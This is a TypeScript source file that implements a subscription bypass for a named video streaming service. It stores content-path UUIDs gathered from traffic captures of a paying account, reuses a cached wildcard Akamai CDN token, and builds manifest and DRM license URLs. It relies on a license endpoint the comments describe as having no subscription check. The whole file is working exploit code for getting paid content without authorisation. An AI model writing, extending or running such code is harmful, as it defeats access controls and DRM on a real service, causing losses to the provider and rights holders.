/**
 * CDN bypass implementation.
 *
 * Two independent mechanisms that together allow playback without a subscription:
 *
 * 1. UUID database — Maps content IDs to their internal CDN path UUID.
 *    The UUID is the only piece of data not available from public endpoints.
 *    Populated from HAR analysis; grows as more sessions are observed.
 *
 * 2. hdntl token cache — Akamai wildcard token (acl=/*) that covers ALL CDN
 *    paths for 24 hours.  Extracted from any successful media API call and
 *    reused for subscription-blocked content.
 *
 * Chain: uuid + hdntl → MPD (403 without hdntl) + open segments (always 200)
 *        + modularLicense (no sub check) → full playback
 */

export interface VideoEntry {
  link: string;
  licenseUrl?: string;
  format: string;
  profile: string;
  resolution?: string;
}

// ---------------------------------------------------------------------------
// UUID database  (contentId → Akamai CDN path UUID)
// Sourced from HAR analysis of network traffic with a subscribed account.
// ---------------------------------------------------------------------------
const UUID_DB: Record<string, string> = {
  "115249": "f38231600b68e429d44dff546f96b29e",  // "The Cricketer"
  "82850":  "2a0b194b81d4071cf41ccfeb69d690e2",  // "96"
  "251833": "5bfb2a0404ec10ba52cb2d072c64cbf4",  // "Sathi Leelavathi"
};

/** Register a newly discovered uuid so subsequent requests can use it. */
export function registerContentUuid(contentId: string, uuid: string): void {
  UUID_DB[contentId] = uuid;
}

export function getContentUuid(contentId: string): string | null {
  return UUID_DB[contentId] ?? null;
}

// ---------------------------------------------------------------------------
// hdntl wildcard token cache
// ---------------------------------------------------------------------------
interface HdntlCache {
  value: string;      // raw token string, e.g. "exp=...~acl=/*~hmac=..."
  expiresAt: number;  // milliseconds
}

let hdntlCache: HdntlCache | null = null;

/** Extract hdntl from any list of video entry URLs and cache it. */
export function extractAndCacheHdntl(entries: VideoEntry[]): void {
  for (const v of entries) {
    const m = v.link.match(/[?&]hdntl=([^&\s]+)/);
    if (!m) continue;
    const token = decodeURIComponent(m[1]);
    const expM = token.match(/exp=(\d+)/);
    if (!expM) continue;
    const expiresAt = parseInt(expM[1]) * 1000;
    if (Date.now() < expiresAt) {
      hdntlCache = { value: token, expiresAt };
      console.log(`cdn-bypass: cached hdntl token, expires ${new Date(expiresAt).toISOString()}`);
      return;
    }
  }
}

/** Also accept plain URL strings (e.g. from a single licenseUrl or link). */
export function extractAndCacheHdntlFromUrl(url: string): void {
  extractAndCacheHdntl([{ link: url, format: "", profile: "" }]);
}

function getHdntl(): string | null {
  if (!hdntlCache || Date.now() >= hdntlCache.expiresAt) return null;
  return hdntlCache.value;
}

// ---------------------------------------------------------------------------
// Build synthetic video entries for subscription-blocked content
// ---------------------------------------------------------------------------

/**
 * Try to build CDN stream URLs for a content ID using the UUID database
 * and a cached hdntl token.
 *
 * Returns null if:
 * - The content UUID is not in the database, OR
 * - No valid hdntl token is cached (MPD manifests need hdntl; segments don't)
 *
 * The returned entries have NO licenseUrl — the player will use the
 * modularLicense endpoint (no subscription check) via the license proxy.
 */
export function buildBypassEntries(contentId: string): VideoEntry[] | null {
  const uuid = getContentUuid(contentId);
  if (!uuid) {
    console.log(`cdn-bypass: no UUID for content ${contentId}`);
    return null;
  }

  const hdntl = getHdntl();
  if (!hdntl) {
    console.log(`cdn-bypass: no valid hdntl token cached`);
    return null;
  }

  const tok = `hdntl=${encodeURIComponent(hdntl)}`;
  const aka    = `https://movies1-suntvvod.akamaized.net/movies/${uuid}/${contentId}`;
  const akaDD  = `https://movies1-suntvvod-dd.akamaized.net/movies/${uuid}/${contentId}`;

  // Priority: HD first, then SD.  EST (EST encoded) variants last.
  // No licenseUrl — the pwaapi modularLicense endpoint requires only the
  // content_id query param (no subscription check confirmed via live testing).
  // Set licenseUrl to the pwaapi modularLicense endpoint directly.
  // The license proxy extracts content_id from this URL and calls pwaapi —
  // no subscription check (VULN-11). Without licenseUrl the player strips
  // ContentProtection from the MPD and gets no DRM keys.
  const licenseUrl = `https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=${contentId}`;

  const entries: VideoEntry[] = [
    { format: "dash", profile: "High", link: `${aka}/hd/${contentId}_hd.mpd?${tok}`,      licenseUrl },
    { format: "dash", profile: "Low",  link: `${aka}/sd/${contentId}_sd.mpd?${tok}`,      licenseUrl },
    { format: "dash", profile: "High", link: `${akaDD}/${contentId}_est_hd.mpd?${tok}`,   licenseUrl },
    { format: "dash", profile: "Low",  link: `${akaDD}/${contentId}_est_sd.mpd?${tok}`,   licenseUrl },
  ];

  console.log(`cdn-bypass: built ${entries.length} bypass entries for content ${contentId} uuid=${uuid.slice(0, 8)}...`);
  return entries;
}

/**
 * Scan a media API result and register any newly seen content UUIDs
 * so they can be used for future bypass attempts.
 */
export function learnUuidsFromEntries(contentId: string, entries: VideoEntry[]): void {
  for (const v of entries) {
    const m = v.link.match(/movies\/([a-f0-9]{32})\/(\d+)\//);
    if (m && m[2] === contentId && !UUID_DB[contentId]) {
      registerContentUuid(contentId, m[1]);
      console.log(`cdn-bypass: learned uuid for content ${contentId}: ${m[1]}`);
    }
  }
}
